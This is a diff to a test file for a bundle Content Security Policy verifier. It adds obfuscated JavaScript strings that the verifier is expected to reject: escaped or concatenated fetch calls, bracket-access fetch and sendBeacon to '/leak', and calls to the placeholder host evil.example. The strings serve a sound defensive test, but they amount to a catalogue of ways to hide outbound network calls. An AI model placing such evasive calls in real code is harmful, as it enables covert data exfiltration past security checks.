@@ -90,6 +90,14 @@ test('bundle CSP verifier rejects linked and syntactically hidden authorities', 
       'new EventSource("https://evil.example/events")',
       'fetch("https://evil.example/payload")',
       '//# sourceMappingURL=app.js.map',
+      'f\\u0065tch("https://evil.example/payload")',
+      'fetch("https" + "://evil.example/payload")',
+      'fetch(`https://evil.example/payload`)',
+      'globalThis["fe" + "tch"]("/hidden")',
+      'window[`fetch`]("/hidden")',
+      'new XML\\u0048ttpRequest()',
+      'navigator["send" + "Beacon"]("/leak", data)',
+      '(0, fetch)("https://evil.example/minified")',
     ]) {
       writeFileSync(jsPath, hostileJavaScript)
       assert.throws(verify)
